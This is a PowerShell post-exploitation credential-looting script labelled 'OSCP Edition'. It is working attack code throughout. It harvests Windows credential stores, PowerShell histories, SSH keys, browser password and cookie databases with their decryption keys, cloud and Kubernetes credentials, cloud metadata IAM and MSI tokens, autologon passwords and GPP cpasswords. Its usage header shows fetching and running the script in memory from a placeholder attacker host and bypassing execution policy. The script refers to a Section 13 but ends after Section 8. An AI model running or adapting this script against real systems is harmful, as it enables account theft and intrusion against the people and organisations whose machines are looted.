#Requires -Version 3.0
<#
.SYNOPSIS
    Invoke-Loot.ps1 - Post-Exploitation Looting Script (OSCP Edition)
.DESCRIPTION
    Comprehensive Windows looting script covering credentials, registry,
    AD recon, cloud creds, containers, network, privesc artifacts and logs.
.USAGE
    # Run as current user:
    .\Invoke-Loot.ps1

    # Custom output directory:
    .\Invoke-Loot.ps1 -OutputDir C:\Users\Public\loot

    # Run from memory (no disk touch):
    IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Loot.ps1')

    # Bypass execution policy:
    powershell -ExecutionPolicy Bypass -File .\Invoke-Loot.ps1
#>

param(
    [string]$OutputDir = "$env:TEMP\.loot_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
)

# =============================================================================
# COLOUR OUTPUT & HELPERS
# =============================================================================

function Write-Info  { Write-Host "[*] $args" -ForegroundColor Cyan }
function Write-OK    { Write-Host "[+] $args" -ForegroundColor Green }
function Write-Warn  { Write-Host "[!] $args" -ForegroundColor Yellow }
function Write-Err   { Write-Host "[-] $args" -ForegroundColor Red }
function Write-Sec   { Write-Host "`n[>>] $args" -ForegroundColor Cyan }
function Write-Hit   { 
    param($msg)
    Write-Host "[!!] HIT: $msg" -ForegroundColor Magenta
    Add-Content -Path "$OutputDir\HITS_SUMMARY.txt" -Value $msg -ErrorAction SilentlyContinue
}

function Safe-Copy {
    param([string]$Src, [string]$Dst)
    try {
        if (Test-Path $Src -PathType Leaf) {
            $null = New-Item -ItemType Directory -Path (Split-Path $Dst) -Force -ErrorAction SilentlyContinue
            Copy-Item -Path $Src -Destination $Dst -Force -ErrorAction Stop
            Write-OK "Copied: $Src"
        }
    } catch {
        Write-Warn "Could not copy: $Src ($_)"
    }
}

function Safe-CopyDir {
    param([string]$Src, [string]$Dst)
    try {
        if (Test-Path $Src -PathType Container) {
            Copy-Item -Path $Src -Destination $Dst -Recurse -Force -ErrorAction SilentlyContinue
            Write-OK "Copied dir: $Src"
        }
    } catch {
        Write-Warn "Could not copy dir: $Src"
    }
}

function Safe-RegExport {
    # NOTE: produces a UTF-16 text .reg file for re-import into the registry only.
    # NOT a binary hive - cannot be parsed by secretsdump/pypykatz. Use reg save for that.
    param([string]$Key, [string]$OutFile)
    try {
        $null = New-Item -ItemType Directory -Path (Split-Path $OutFile) -Force -ErrorAction SilentlyContinue
        $result = reg export $Key $OutFile /y 2>&1
        if (Test-Path $OutFile) {
            Write-OK "Registry exported (text/import format): $Key"
        }
    } catch {
        Write-Warn "Could not export registry: $Key"
    }
}

function Safe-RegQuery {
    param([string]$Key)
    try {
        return Get-ItemProperty -Path $Key -ErrorAction Stop
    } catch {
        return $null
    }
}

function Invoke-Section {
    param([string]$Name)
    $line = "=" * 60
    Write-Sec $Name
    Add-Content -Path "$OutputDir\HITS_SUMMARY.txt" -Value "`n--- $Name ---" -ErrorAction SilentlyContinue
}

function Out-LootFile {
    param([string]$Path, [string]$Content)
    try {
        $null = New-Item -ItemType Directory -Path (Split-Path $Path) -Force -ErrorAction SilentlyContinue
        Set-Content -Path $Path -Value $Content -ErrorAction SilentlyContinue
    } catch {}
}

# =============================================================================
# SETUP
# =============================================================================

$null = New-Item -ItemType Directory -Path $OutputDir -Force

# Determine privilege level
$currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$IsAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$IsSystem = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM"

$Hostname = $env:COMPUTERNAME
$Username = $env:USERNAME
$Domain   = $env:USERDOMAIN

Write-Host @"

$([char]0x2554)$([string][char]0x2550 * 54)$([char]0x2557)
$([char]0x2551)    Invoke-Loot.ps1 - OSCP Edition (Full)      $([char]0x2551)
$([char]0x2551)  Creds | AD | Cloud | Docker | Privesc | Logs $([char]0x2551)
$([char]0x255A)$([string][char]0x2550 * 54)$([char]0x255D)
"@ -ForegroundColor Cyan

Write-Info "Host:      $Hostname"
Write-Info "User:      $Domain\$Username"
Write-Info "Admin:     $IsAdmin"
Write-Info "SYSTEM:    $IsSystem"
Write-Info "Loot Dir:  $OutputDir"

$hitsFile = "$OutputDir\HITS_SUMMARY.txt"
Set-Content -Path $hitsFile -Value "Loot started: $(Get-Date)"
Add-Content -Path $hitsFile -Value "Host: $Hostname | User: $Domain\$Username | Admin: $IsAdmin | SYSTEM: $IsSystem"
Add-Content -Path $hitsFile -Value ("=" * 60)

# =============================================================================
# SECTION 1: SYSTEM SNAPSHOT
# =============================================================================
Invoke-Section "System Snapshot"
$sysDir = "$OutputDir\system"
$null = New-Item -ItemType Directory -Path $sysDir -Force

$sysInfo = @()
$sysInfo += "=== Hostname ==="; $sysInfo += $env:COMPUTERNAME
$sysInfo += "=== Date ==="; $sysInfo += Get-Date
$sysInfo += "=== OS Version ==="; $sysInfo += (Get-WmiObject Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture | Format-List | Out-String)
$sysInfo += "=== Hotfixes (last 20) ==="; $sysInfo += (Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20 | Format-Table | Out-String)
$sysInfo += "=== System Info ==="; $sysInfo += (systeminfo 2>$null)
$sysInfo += "=== Whoami /all ==="; $sysInfo += (whoami /all 2>$null)
$sysInfo += "=== Environment Variables ==="; $sysInfo += (Get-ChildItem Env: | Format-Table -AutoSize | Out-String)
$sysInfo += "=== IP Configuration ==="; $sysInfo += (ipconfig /all 2>$null)
$sysInfo += "=== Routing Table ==="; $sysInfo += (route print 2>$null)
$sysInfo += "=== ARP Cache ==="; $sysInfo += (arp -a 2>$null)
$sysInfo += "=== DNS Cache ==="; $sysInfo += (ipconfig /displaydns 2>$null)
$sysInfo += "=== Active Connections ==="; $sysInfo += (netstat -ano 2>$null)
$sysInfo += "=== Running Processes ==="; $sysInfo += (Get-Process | Format-Table Id,Name,Path,Company -AutoSize | Out-String)
$sysInfo += "=== Logged On Users ==="; $sysInfo += (query user 2>$null)
$sysInfo += "=== Installed Software ==="; $sysInfo += (Get-WmiObject Win32_Product | Select-Object Name,Version,InstallLocation | Sort-Object Name | Format-Table -AutoSize | Out-String)
Out-LootFile "$sysDir\system_info.txt" ($sysInfo -join "`n")
Write-OK "System snapshot saved"

# =============================================================================
# SECTION 2: USER & GROUP ENUMERATION
# =============================================================================
Invoke-Section "Users & Groups"
$usersDir = "$OutputDir\users_groups"
$null = New-Item -ItemType Directory -Path $usersDir -Force

{
    "=== Local Users ==="
    net user 2>$null
    "=== Local Admins ==="
    net localgroup administrators 2>$null
    "=== All Local Groups ==="
    net localgroup 2>$null
    "=== Current User Full Details ==="
    net user $env:USERNAME 2>$null
    "=== Domain Admins ==="
    net group "Domain Admins" /domain 2>$null
    "=== Enterprise Admins ==="
    net group "Enterprise Admins" /domain 2>$null
    "=== All Domain Groups ==="
    net group /domain 2>$null
} | Out-File "$usersDir\users_groups.txt" -ErrorAction SilentlyContinue

# Password policy
net accounts 2>$null | Out-File "$usersDir\local_password_policy.txt" -ErrorAction SilentlyContinue
net accounts /domain 2>$null | Out-File "$usersDir\domain_password_policy.txt" -ErrorAction SilentlyContinue

Write-OK "User/group enumeration saved"

# =============================================================================
# SECTION 3: TOKEN PRIVILEGES & INTERESTING GROUPS
# =============================================================================
Invoke-Section "Token Privileges & Group Membership"
$privDir = "$OutputDir\privileges"
$null = New-Item -ItemType Directory -Path $privDir -Force

$whoamiAll = whoami /all 2>$null
$whoamiAll | Out-File "$privDir\whoami_all.txt" -ErrorAction SilentlyContinue

# Flag dangerous privileges
$dangerPrivs = @(
    "SeDebugPrivilege",
    "SeImpersonatePrivilege",
    "SeAssignPrimaryTokenPrivilege",
    "SeBackupPrivilege",
    "SeRestorePrivilege",
    "SeTakeOwnershipPrivilege",
    "SeLoadDriverPrivilege",
    "SeCreateTokenPrivilege",
    "SeTcbPrivilege",
    "SeManageVolumePrivilege"
)

foreach ($priv in $dangerPrivs) {
    if ($whoamiAll -match $priv) {
        Write-Hit "Dangerous privilege found: $priv"
    }
}

# Flag dangerous group memberships
$dangerGroups = @(
    "Administrators",
    "Backup Operators",
    "Server Operators",
    "Account Operators",
    "Print Operators",
    "DnsAdmins",
    "Remote Desktop Users",
    "Network Configuration Operators",
    "Event Log Readers",
    "Hyper-V Administrators",
    "Remote Management Users"
)

$userGroups = (whoami /groups 2>$null) -join " "
foreach ($group in $dangerGroups) {
    if ($userGroups -match [regex]::Escape($group)) {
        Write-Hit "Member of high-value group: $group"
    }
}

Write-OK "Privilege info saved"

# =============================================================================
# SECTION 4: CREDENTIAL STORES
# =============================================================================
Invoke-Section "Credential Stores"
$credsDir = "$OutputDir\credentials"
$null = New-Item -ItemType Directory -Path $credsDir -Force

# Windows Credential Manager
Write-Info "Dumping Credential Manager..."
$cmdkeyOut = cmdkey /list 2>$null
if ($cmdkeyOut -match "Target:") {
    $cmdkeyOut | Out-File "$credsDir\credential_manager.txt" -ErrorAction SilentlyContinue
    Write-Hit "Credential Manager has stored credentials  - see credentials\credential_manager.txt"
} else {
    $cmdkeyOut | Out-File "$credsDir\credential_manager.txt" -ErrorAction SilentlyContinue
    Write-OK "Credential Manager saved (may be empty)"
}

# DPAPI credential blobs
$dpapDirs = @(
    "$env:APPDATA\Microsoft\Credentials",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect"
)
foreach ($d in $dpapDirs) {
    if (Test-Path $d) {
        $files = Get-ChildItem $d -Force -ErrorAction SilentlyContinue
        if ($files) {
            Safe-CopyDir $d "$credsDir\dpapi\$(Split-Path $d -Leaf)"
            Write-Hit "DPAPI blobs found in: $d"
        }
    }
}

# PowerShell history  - THE most overlooked credential source
$psHistPaths = @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
)
foreach ($h in $psHistPaths) {
    if (Test-Path $h) {
        Safe-Copy $h "$credsDir\powershell_history.txt"
        $histContent = Get-Content $h -ErrorAction SilentlyContinue
        $credLines = $histContent | Select-String -Pattern "password|passwd|secret|token|api|cred|key|-AsPlainText" -CaseSensitive:$false
        if ($credLines) {
            $credLines | Out-File "$credsDir\powershell_history_CREDS.txt" -ErrorAction SilentlyContinue
            Write-Hit "Credentials found in PowerShell history!"
        }
    }
}

# All users' PS history (if admin)
if ($IsAdmin) {
    Get-WmiObject Win32_UserProfile | Where-Object { $_.LocalPath -and (Test-Path $_.LocalPath) } | ForEach-Object {
        $histPath = "$($_.LocalPath)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $histPath) {
            $userName = Split-Path $_.LocalPath -Leaf
            Safe-Copy $histPath "$credsDir\ps_history_$userName.txt"
            $credLines = Get-Content $histPath -ErrorAction SilentlyContinue | Select-String -Pattern "password|secret|token|api|cred" -CaseSensitive:$false
            if ($credLines) {
                Write-Hit "Credentials in PS history of user: $userName"
            }
        }
    }
}

# Git credentials
foreach ($f in @("$env:USERPROFILE\.git-credentials", "$env:USERPROFILE\.gitconfig")) {
    if (Test-Path $f) {
        Safe-Copy $f "$credsDir\$(Split-Path $f -Leaf)"
        Write-Hit "Git credential file found: $f"
    }
}

# SSH keys
if (Test-Path "$env:USERPROFILE\.ssh") {
    Safe-CopyDir "$env:USERPROFILE\.ssh" "$credsDir\ssh"
    $keys = Get-ChildItem "$env:USERPROFILE\.ssh" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "id_|\.pem$|\.key$" }
    if ($keys) {
        Write-Hit "SSH keys found: $($keys.FullName -join ', ')"
    }
}

# PuTTY saved sessions
$puttyPath = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
if (Test-Path $puttyPath) {
    $sessions = Get-ChildItem $puttyPath -ErrorAction SilentlyContinue
    $puttyOut = @()
    foreach ($session in $sessions) {
        $props = Get-ItemProperty $session.PSPath -ErrorAction SilentlyContinue
        $puttyOut += "=== $($session.PSChildName) ==="
        $puttyOut += ($props | Format-List | Out-String)
    }
    $puttyOut | Out-File "$credsDir\putty_sessions.txt" -ErrorAction SilentlyContinue
    if ($sessions) { Write-Hit "PuTTY saved sessions found: $($sessions.Count) session(s)" }
}

# WinSCP saved sessions
$winscpPath = "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions"
if (Test-Path $winscpPath) {
    $sessions = Get-ChildItem $winscpPath -ErrorAction SilentlyContinue
    $winscpOut = @()
    foreach ($session in $sessions) {
        $props = Get-ItemProperty $session.PSPath -ErrorAction SilentlyContinue
        $winscpOut += "=== $($session.PSChildName) ==="
        $winscpOut += ($props | Format-List | Out-String)
    }
    $winscpOut | Out-File "$credsDir\winscp_sessions.txt" -ErrorAction SilentlyContinue
    if ($sessions) { Write-Hit "WinSCP saved sessions found: $($sessions.Count) session(s)" }
}

# RDP saved servers
$rdpPath = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
if (Test-Path $rdpPath) {
    $rdpServers = Get-ChildItem $rdpPath -ErrorAction SilentlyContinue
    $rdpOut = $rdpServers | ForEach-Object {
        $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
        "$($_.PSChildName) => Username: $($props.UsernameHint)"
    }
    $rdpOut | Out-File "$credsDir\rdp_saved_servers.txt" -ErrorAction SilentlyContinue
    if ($rdpServers) { Write-Hit "RDP saved server entries found: $($rdpServers.Count)" }
}

# MobaXterm
$mobaPath = "$env:APPDATA\MobaXterm"
if (Test-Path $mobaPath) {
    Safe-CopyDir $mobaPath "$credsDir\mobaxterm"
    Write-Hit "MobaXterm data found  - check credentials\mobaxterm\"
}

# Netrc
foreach ($f in @("$env:USERPROFILE\.netrc", "$env:USERPROFILE\_netrc")) {
    if (Test-Path $f) {
        Safe-Copy $f "$credsDir\netrc"
        Write-Hit "Netrc file found: $f"
    }
}

# NPM config
if (Test-Path "$env:USERPROFILE\.npmrc") {
    Safe-Copy "$env:USERPROFILE\.npmrc" "$credsDir\npmrc"
    if (Select-String -Path "$env:USERPROFILE\.npmrc" -Pattern "_authToken|_auth|password" -Quiet -ErrorAction SilentlyContinue) {
        Write-Hit "NPM auth token found in .npmrc!"
    }
}

Write-OK "Credential stores enumerated"

# =============================================================================
# SECTION 5: BROWSER CREDENTIALS
# =============================================================================
Invoke-Section "Browser Saved Passwords"
$browserDir = "$OutputDir\browsers"
$null = New-Item -ItemType Directory -Path $browserDir -Force

$browserProfiles = @{
    "Chrome"          = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"            = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"           = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"           = "$env:APPDATA\Opera Software\Opera Stable"
    "Chromium"        = "$env:LOCALAPPDATA\Chromium\User Data"
    "Vivaldi"         = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

foreach ($browser in $browserProfiles.GetEnumerator()) {
    $profileBase = $browser.Value
    if (Test-Path $profileBase) {
        $profiles = @("Default") + (Get-ChildItem $profileBase -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "^Profile \d+" } | Select-Object -ExpandProperty Name)
        foreach ($profile in $profiles) {
            $profilePath = "$profileBase\$profile"
            if (Test-Path $profilePath) {
                $dest = "$browserDir\$($browser.Key)\$profile"
                $null = New-Item -ItemType Directory -Path $dest -Force -ErrorAction SilentlyContinue
                foreach ($file in @("Login Data", "Cookies", "Web Data", "History", "Bookmarks")) {
                    Safe-Copy "$profilePath\$file" "$dest\$file"
                }
                # Local State contains encryption key
                Safe-Copy "$profileBase\Local State" "$browserDir\$($browser.Key)\Local_State"
                Write-Hit "$($browser.Key) profile found: $profile  - Login Data copied (decrypt with SharpChrome or HackBrowserData)"
            }
        }
    }
}

# Firefox
$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffBase) {
    Get-ChildItem $ffBase -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $dest = "$browserDir\Firefox\$($_.Name)"
        $null = New-Item -ItemType Directory -Path $dest -Force -ErrorAction SilentlyContinue
        foreach ($file in @("logins.json", "key4.db", "cert9.db", "cookies.sqlite", "places.sqlite")) {
            Safe-Copy "$($_.FullName)\$file" "$dest\$file"
        }
        Write-Hit "Firefox profile found: $($_.Name)  - decrypt with firefox_decrypt"
    }
}

Write-OK "Browser data collected"

# =============================================================================
# SECTION 6: CLOUD CREDENTIALS
# =============================================================================
Invoke-Section "Cloud Credentials"
$cloudDir = "$OutputDir\cloud"
$null = New-Item -ItemType Directory -Path $cloudDir -Force

# AWS
foreach ($f in @("$env:USERPROFILE\.aws\credentials", "$env:USERPROFILE\.aws\config")) {
    if (Test-Path $f) {
        Safe-Copy $f "$cloudDir\aws\$(Split-Path $f -Leaf)"
        Write-Hit "AWS credential file found: $f"
    }
}

# Azure
if (Test-Path "$env:USERPROFILE\.azure") {
    Safe-CopyDir "$env:USERPROFILE\.azure" "$cloudDir\azure"
    Write-Hit "Azure CLI credentials found at $env:USERPROFILE\.azure"
}

# GCP
foreach ($gcloudPath in @("$env:APPDATA\gcloud", "$env:USERPROFILE\.config\gcloud")) {
    if (Test-Path $gcloudPath) {
        Safe-CopyDir $gcloudPath "$cloudDir\gcloud"
        Write-Hit "GCP credentials found at $gcloudPath"
    }
}

# Kubernetes
if (Test-Path "$env:USERPROFILE\.kube\config") {
    Safe-Copy "$env:USERPROFILE\.kube\config" "$cloudDir\kube_config"
    Write-Hit "Kubernetes config found: $env:USERPROFILE\.kube\config"
}

# Docker
if (Test-Path "$env:USERPROFILE\.docker\config.json") {
    Safe-Copy "$env:USERPROFILE\.docker\config.json" "$cloudDir\docker_config.json"
    Write-Hit "Docker registry credentials found!"
}

# Terraform
foreach ($f in @("$env:USERPROFILE\.terraformrc", "$env:APPDATA\terraform.d\credentials.tfrc.json")) {
    if (Test-Path $f) {
        Safe-Copy $f "$cloudDir\$(Split-Path $f -Leaf)"
        Write-Hit "Terraform credential file: $f"
    }
}

# HashiCorp Vault
if (Test-Path "$env:USERPROFILE\.vault-token") {
    Safe-Copy "$env:USERPROFILE\.vault-token" "$cloudDir\vault_token"
    Write-Hit "HashiCorp Vault token found!"
}

# AWS metadata (if EC2 instance)
Write-Info "Probing AWS metadata service..."
try {
    $awsMeta = Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/" -TimeoutSec 2 -UseBasicParsing -ErrorAction Stop
    if ($awsMeta.StatusCode -eq 200) {
        $iamRole = (Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -UseBasicParsing -ErrorAction SilentlyContinue).Content
        $iamCreds = (Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$iamRole" -UseBasicParsing -ErrorAction SilentlyContinue).Content
        $userData = (Invoke-WebRequest -Uri "http://169.254.169.254/latest/user-data" -UseBasicParsing -ErrorAction SilentlyContinue).Content
        @("IAM Role: $iamRole", "Credentials: $iamCreds", "UserData: $userData") | Out-File "$cloudDir\aws_metadata.txt"
        Write-Hit "AWS metadata service accessible  - IAM credentials extracted!"
    }
} catch {}

# Azure metadata
try {
    $azMeta = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Headers @{"Metadata"="true"} -TimeoutSec 2 -UseBasicParsing -ErrorAction Stop
    if ($azMeta.StatusCode -eq 200) {
        $msiToken = (Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{"Metadata"="true"} -UseBasicParsing -ErrorAction SilentlyContinue).Content
        @("Instance: $($azMeta.Content)", "MSI Token: $msiToken") | Out-File "$cloudDir\azure_metadata.txt"
        Write-Hit "Azure metadata service accessible  - MSI token extracted!"
    }
} catch {}

Write-OK "Cloud credentials collected"

# =============================================================================
# SECTION 7: REGISTRY  - HIGH VALUE KEYS
# =============================================================================
Invoke-Section "Registry  - High Value Keys"
$regDir = "$OutputDir\registry"
$null = New-Item -ItemType Directory -Path $regDir -Force

# Autologon  - plaintext password
Write-Info "Checking autologon credentials..."
$winlogon = Safe-RegQuery "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
if ($winlogon) {
    $winlogon | Format-List | Out-String | Out-File "$regDir\winlogon.txt" -ErrorAction SilentlyContinue
    if ($winlogon.DefaultPassword -and $winlogon.DefaultPassword -ne "") {
        Write-Hit "AUTOLOGON PLAINTEXT PASSWORD FOUND: User=$($winlogon.DefaultUserName) Pass=$($winlogon.DefaultPassword)"
    }
    if ($winlogon.AltDefaultPassword -and $winlogon.AltDefaultPassword -ne "") {
        Write-Hit "AUTOLOGON ALT PASSWORD FOUND: User=$($winlogon.AltDefaultUserName) Pass=$($winlogon.AltDefaultPassword)"
    }
}

# AlwaysInstallElevated  - trivial SYSTEM via MSI
$aieHKCU = (Safe-RegQuery "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
$aieHKLM = (Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
if ($aieHKCU -eq 1 -and $aieHKLM -eq 1) {
    Write-Hit "AlwaysInstallElevated is ENABLED  - create malicious MSI for SYSTEM!"
    "AlwaysInstallElevated: HKCU=$aieHKCU HKLM=$aieHKLM" | Out-File "$regDir\always_install_elevated.txt"
}

# WDigest  - plaintext creds in LSASS if enabled
$wdigest = (Safe-RegQuery "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest").UseLogonCredential
"WDigest UseLogonCredential: $wdigest" | Out-File "$regDir\wdigest.txt" -ErrorAction SilentlyContinue
if ($wdigest -eq 1) {
    Write-Hit "WDigest UseLogonCredential=1  - plaintext credentials in LSASS memory!"
}

# LAPS  - if not installed, local admin password is probably the same everywhere
$laps = Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd"
if (-not $laps) {
    Write-Hit "LAPS does not appear to be installed  - local admin password may be reused across machines!"
    "LAPS not found in registry" | Out-File "$regDir\laps_check.txt"
} else {
    $laps | Format-List | Out-String | Out-File "$regDir\laps_config.txt" -ErrorAction SilentlyContinue
}

# UAC settings
$uac = Safe-RegQuery "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if ($uac) {
    $uac | Format-List | Out-String | Out-File "$regDir\uac_settings.txt" -ErrorAction SilentlyContinue
    if ($uac.EnableLUA -eq 0) { Write-Hit "UAC is DISABLED!" }
    if ($uac.ConsentPromptBehaviorAdmin -eq 0) { Write-Hit "UAC set to no-prompt for admins!" }
}

# LSA settings
$lsa = Safe-RegQuery "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
if ($lsa) {
    $lsa | Format-List | Out-String | Out-File "$regDir\lsa_settings.txt" -ErrorAction SilentlyContinue
    if ($lsa.LsaCfgFlags -eq 1 -or $lsa.LsaCfgFlags -eq 2) {
        Write-Hit "LSA RunAsPPL (Protected Process Light) is enabled  - harder to dump LSASS"
    }
    if ($lsa.DisableRestrictedAdmin -eq 1) {
        Write-Hit "RestrictedAdmin disabled  - pass-the-hash for RDP may be possible!"
    }
}

# PuTTY private keys stored in registry
$puttyRegKeys = "HKCU:\Software\SimonTatham\PuTTY\SshHostKeys"
if (Test-Path $puttyRegKeys) {
    Get-ItemProperty $puttyRegKeys -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File "$regDir\putty_host_keys.txt"
    Write-Hit "PuTTY host keys in registry"
}

# Recently run commands (RunMRU)
$runMRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $runMRU) {
    Get-ItemProperty $runMRU -ErrorAction SilentlyContinue | Format-List | Out-String | Out-File "$regDir\run_mru.txt"
    Write-OK "RunMRU (recently run commands) saved"
}

# Group Policy Preferences (GPP) passwords  - AES key is public
Write-Info "Checking for GPP passwords in SYSVOL..."
$gppPaths = @(
    "\\$Domain\SYSVOL\$Domain\Policies",
    "C:\ProgramData\Microsoft\Group Policy\History"
)
foreach ($gppBase in $gppPaths) {
    if (Test-Path $gppBase) {
        $gppFiles = Get-ChildItem $gppBase -Recurse -Filter "Groups.xml" -ErrorAction SilentlyContinue
        $gppFiles += Get-ChildItem $gppBase -Recurse -Filter "Services.xml" -ErrorAction SilentlyContinue
        $gppFiles += Get-ChildItem $gppBase -Recurse -Filter "Scheduledtasks.xml" -ErrorAction SilentlyContinue
        $gppFiles += Get-ChildItem $gppBase -Recurse -Filter "DataSources.xml" -ErrorAction SilentlyContinue
        foreach ($gppFile in $gppFiles) {
            $content = Get-Content $gppFile.FullName -ErrorAction SilentlyContinue
            if ($content -match 'cpassword') {
                Safe-Copy $gppFile.FullName "$regDir\gpp\$($gppFile.Name)"
                Write-Hit "GPP cpassword found in: $($gppFile.FullName)  - decrypt with gpp-decrypt!"
            }
        }
    }
}

# Binary hive extraction is handled in Section 13 (VSS + reg save fallback)

Write-OK "Registry enumeration complete"

# =============================================================================
# SECTION 8: SENSITIVE FILE HUNTING
# =============================================================================
Invoke-Section "Sensitive File Hunt"
$filesDir = "$OutputDir\sensitive_files"
$null = New-Item -ItemType Directory -Path $filesDir -Force

# Unattend / sysprep files  - base64 admin passwords from deployment
Write-Info "Searching for unattend/sysprep files..."
$unattendPaths = @(
    "C:\unattend.xml", "C:\unattend.txt",
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattended.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep\sysprep.inf",
    "C:\Windows\system32\sysprep\Panther\unattend.xml"
)
foreach ($f in $unattendPaths) {
    if (Test-Path $f) {
        Safe-Copy $f "$filesDir\unattend\$(Split-Path $f -Leaf)"
        Write-Hit "Unattend/sysprep file found: $f  - check for base64 admin passwords!"
    }
}

# IIS web.config files
Write-Info "Searching for web.config files..."
Get-ChildItem "C:\inetpub" -Recurse -Filter "web.config" -ErrorAction SilentlyContinue | ForEach-Object {
    Safe-Copy $_.FullName "$filesDir\webconfigs\$(($_.FullName -replace '[:\\]','_'))"
    if (Select-String -Path $_.FullName -Pattern "password|connectionString|pwd" -Quiet -ErrorAction SilentlyContinue) {
        Write-Hit "Credentials in web.config: $($_.FullName)"
    }
}

# PHP config files
Write-Info "Searching for PHP/app config files..."
$configPatterns = @("wp-config.php","config.php","configuration.php","settings.php","database.php","db.php","connection.php",".env","appsettings.json","application.properties","parameters.yml")
foreach ($pattern in $configPatterns) {
    Get-ChildItem "C:\inetpub","C:\xampp","C:\wamp","C:\www","C:\htdocs" -Recurse -Filter $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        Safe-Copy $_.FullName "$filesDir\app_configs\$(($_.FullName -replace '[:\\]','_'))"
        Write-Hit "App config found: $($_.FullName)"
    }
}

# PowerShell scripts with hardcoded credentials
Write-Info "Searching for credentials in PowerShell scripts..."
$psScriptDirs = @("C:\Scripts","C:\Users","C:\inetpub","C:\Program Files","C:\Program Files (x86)","$env:USERPROFILE")
foreach ($dir in $psScriptDirs) {
    if (Test-Path $dir) {
        Get-ChildItem $dir -Recurse -Include "*.ps1","*.psm1","*.psd1" -ErrorAction SilentlyContinue | ForEach-Object {
            $matches = Select-String -Path $_.FullName -Pattern "password|passwd|secret|credential|ConvertTo-SecureString|-AsPlainText" -CaseSensitive:$false -ErrorAction SilentlyContinue
            if ($matches) {
                Safe-Copy $_.FullName "$filesDir\scripts\$(($_.FullName -replace '[:\\]','_'))"
                Write-Hit "Credentials in PS script: $($_.FullName)"
            }
        }
    }
}

# Batch/cmd scripts
Write-Info "Searching for credentials in batch scripts..."
Get-ChildItem "C:\","C:\Users","C:\Scripts" -Recurse -Include "*.bat","*.cmd" -ErrorAction SilentlyContinue | ForEach-Object {
    $matches = Select-String -Path $_.FullName -Pattern "password|passwd|net use.*password|runas" -CaseSensitive:$false -ErrorAction SilentlyContinue
    if ($matches) {
        Safe-Copy $_.FullName "$filesDir\scripts\$(($_.FullName -replace '[:\\]','_'))"
        Write-Hit "Credentials in batch script: $($_.FullName)"
    }
}

# Generic credential file search by name
Write-Info "Searching for credential files by name..."
$credFilePatterns = @("*password*","*passwd*","*credentials*","*creds*","*secret*","*apikey*","*api_key*")
foreach ($pattern in $credFilePatterns) {
    Get-ChildItem "C:\Users","C:\","C:\inetpub","C:\Program Files","C:\Program Files (x86)" -Recurse -Filter $pattern -ErrorAction SilentlyContinue | 
        Where-Object { -not $_.PSIsContainer } | Select-Object -First 30 | ForEach-Object {
            Safe-Copy $_.FullName "$filesDir\named_creds\$(($_.FullName -replace '[:\\]','_'))"
            Write-Hit "Credential-named file: $($_.FullName)"
        }
}

# Certificate and key files
Write-Info "Searching for certificates and key files..."
Get-ChildItem "C:\" -Recurse -Include "*.pfx","*.p12","*.pem","*.key","*.cer","*.jks" -ErrorAction SilentlyContinue | 
    Select-Object -First 30 | ForEach-Object {
        Safe-Copy $_.FullName "$filesDir\certs\$(($_.FullName -replace '[:\\]','_'))"
        Write-Hit "Certificate/key file found: $($_.FullName)"
    }

# Backup files
Write-Info "Searching for backup archives..."
Get-ChildItem "C:\","C:\Users","C:\inetpub","C:\Backup" -Recurse -Include "*.bak","*.backup","*.old","*.zip","*.7z","*.tar","*.gz" -ErrorAction SilentlyContinue |
    Select-Object -First 50 | ForEach-Object {
        "$($_.FullName) [$([math]::Round($_.Length/1MB,2)) MB]"
    } | Out-File "$filesDir\backup_files_found.txt" -ErrorAction SilentlyContinue
